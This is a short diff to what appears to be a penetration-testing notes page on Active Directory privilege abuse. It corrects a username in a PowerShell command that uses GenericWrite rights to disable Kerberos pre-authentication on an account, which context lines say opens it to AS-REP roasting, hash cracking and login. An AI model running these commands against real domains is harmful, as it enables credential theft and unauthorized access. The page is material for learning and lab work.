@@ -37,7 +37,7 @@ Set-DomainObject -Identity adams -XOR @{UserAccountControl=4194304}
 ### 2. Abusing GenericWrite Perm on a User
 Here lily is the user on which we have generic write perm we can set this user to PreAuth and then by using [AS-REP Roasting](https://k4sth4.github.io/Kerberos/) we can get the user hash and crack it and login into system.
 ```markdown
-Set-ADAccountControl -Identity manager -DoesNotRequirePreAuth $true
+Set-ADAccountControl -Identity lily -DoesNotRequirePreAuth $true
 ```
 Now we can do [AS-REP Roasting](https://k4sth4.github.io/Kerberos/).
 
